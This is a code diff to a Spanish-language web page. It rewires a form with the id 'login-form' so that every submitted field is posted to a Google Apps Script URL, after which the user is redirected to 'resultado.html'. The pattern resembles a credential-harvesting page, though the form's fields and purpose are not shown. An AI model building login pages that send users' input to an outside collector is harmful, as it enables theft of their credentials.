@@ -59,10 +59,16 @@
     </form>
     
     <script>
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbzVfcqJrq-HGOnnRbbrziepd_NKa-eqPmDQiIkI389JjnTecxzu_vNmFYKJx8Vyr2cp6A/exec'; // Pega tu URL aquí
+    
       document.getElementById("login-form").addEventListener("submit", function(e) {
-        e.preventDefault(); // Previene que recargue o intente enviar a /api
-        // Aquí podrías registrar los datos si tuvieras backend
-        window.location.href = "resultado.html"; // Redirige al resultado
+        e.preventDefault();
+    
+        const formData = new FormData(e.target);
+    
+        fetch(scriptURL, { method: 'POST', body: formData })
+          .then(() => window.location.href = "resultado.html")
+          .catch(err => alert("Error al enviar"));
       });
     </script>
   </div>
